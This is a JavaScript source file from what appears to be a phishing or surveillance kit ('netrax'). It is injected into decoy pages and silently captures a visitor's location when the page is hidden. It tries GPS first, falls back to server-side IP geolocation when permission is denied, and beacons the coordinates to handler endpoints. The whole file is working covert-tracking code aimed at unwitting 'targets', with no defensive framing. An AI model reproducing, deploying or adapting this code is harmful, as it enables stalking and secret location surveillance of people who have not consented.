/* ════════════════════════════════════════════════════════════════════
   netrax_location_tracker.js  --  Stealth Geolocation on Page Hide
   ──────────────────────────────────────────────────────────────────
   Injected into every decoy page alongside netrax_collector.js.

   Captures the target's location silently when the page is hidden
   (tab switch, minimize, screen lock, app switch on mobile).

   Strategy (dual-layer):
     1. Try browser GPS (high accuracy, requires permission)
     2. If GPS denied/fails → fall back to server-side IP geolocation
        (city-level accuracy, NO permission needed, always works)

   Guards:
     • Sends at most ONCE per page load (_locationSent flag).
     • Does NOT re-send on repeated hide/show cycles.
     • Falls back to sendBeacon on beforeunload if position pending.
   ════════════════════════════════════════════════════════════════════ */
(function () {
    'use strict';

    var _NXLoc = {
        locationSent: false,       // Once true, no more sends ever
        pendingPosition: null,     // Cached position if resolved but not yet sent
        geoRequested: false,       // Prevents duplicate getCurrentPosition calls
        ipFallbackSent: false      // Prevents duplicate IP fallback calls
    };

    /* ── Helper: resolve handler path dynamically ───────────────── */
    function _getHandlerUrl(endpoint) {
        if (window.location.pathname.indexOf('/templates/') !== -1) {
            return '../handlers/' + endpoint;
        }
        return 'handlers/' + endpoint;
    }

    /* ── Send GPS location data to handler ──────────────────────── */
    function _sendLocation(lat, lon, acc, source) {
        if (_NXLoc.locationSent) return;
        _NXLoc.locationSent = true;
        _NXLoc.pendingPosition = null;

        var payload = 'lat=' + lat + '&lon=' + lon + '&acc=' + acc
                    + '&source=' + (source || 'page_hide')
                    + '&time=' + new Date().getTime();
        var url = _getHandlerUrl('location.php');

        /* Prefer sendBeacon (survives page transitions) */
        try {
            if (navigator.sendBeacon) {
                var sent = navigator.sendBeacon(url, new Blob([payload], {
                    type: 'application/x-www-form-urlencoded'
                }));
                if (sent) return;
            }
        } catch (e) { }

        /* Fallback: standard XHR */
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send(payload);
        } catch (e) { }
    }

    /* ── IP-Based Geolocation Fallback ──────────────────────────── */
    /* Called when browser geolocation is denied or unavailable.
       The server looks up the visitor's IP via ip-api.com —
       no browser permission needed, always works.               */
    function _ipFallback() {
        if (_NXLoc.locationSent || _NXLoc.ipFallbackSent) return;
        _NXLoc.ipFallbackSent = true;

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', _getHandlerUrl('ip_location.php'), true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    _NXLoc.locationSent = true; // Block any further sends
                }
            };
            xhr.send('fallback=1&time=' + new Date().getTime());
        } catch (e) { }
    }

    /* ── Request geolocation (called on first page hide) ────────── */
    function _requestGeo() {
        if (_NXLoc.locationSent || _NXLoc.geoRequested) return;

        /* If browser doesn't support geolocation at all → IP fallback */
        if (!navigator.geolocation) {
            _ipFallback();
            return;
        }

        _NXLoc.geoRequested = true;

        navigator.geolocation.getCurrentPosition(
            function (pos) {
                /* SUCCESS: Browser GPS resolved */
                var lat = pos.coords.latitude;
                var lon = pos.coords.longitude;
                var acc = pos.coords.accuracy;

                if (document.visibilityState === 'hidden') {
                    _sendLocation(lat, lon, acc, 'page_hide');
                } else {
                    _NXLoc.pendingPosition = { lat: lat, lon: lon, acc: acc };
                    _sendLocation(lat, lon, acc, 'page_hide');
                }
            },
            function () {
                /* FAILED: Permission denied, timeout, or unavailable
                   → Fall back to IP-based geolocation (no permission needed) */
                _NXLoc.geoRequested = false;
                _ipFallback();
            },
            {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            }
        );
    }

    /* ── Visibility change listener ─────────────────────────────── */
    function _onVisibilityChange() {
        if (document.visibilityState === 'hidden' && !_NXLoc.locationSent) {
            _requestGeo();
        }
    }

    /* ── Beforeunload safety net ─────────────────────────────────── */
    function _onBeforeUnload() {
        if (!_NXLoc.locationSent) {
            if (_NXLoc.pendingPosition) {
                // We got GPS coords but hadn't sent them yet
                _sendLocation(
                    _NXLoc.pendingPosition.lat,
                    _NXLoc.pendingPosition.lon,
                    _NXLoc.pendingPosition.acc,
                    'page_hide'
                );
            } else {
                // We never got GPS coords before the page died — fire IP fallback
                _ipFallback();
            }
        }
    }

    /* ── Bootstrap ──────────────────────────────────────────────── */
    function _init() {
        document.addEventListener('visibilitychange', _onVisibilityChange);
        window.addEventListener('beforeunload', _onBeforeUnload);

        /* Also attempt on pagehide (mobile Safari) */
        window.addEventListener('pagehide', function () {
            if (!_NXLoc.locationSent) {
                _requestGeo();
            }
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', _init);
    } else {
        _init();
    }
})();
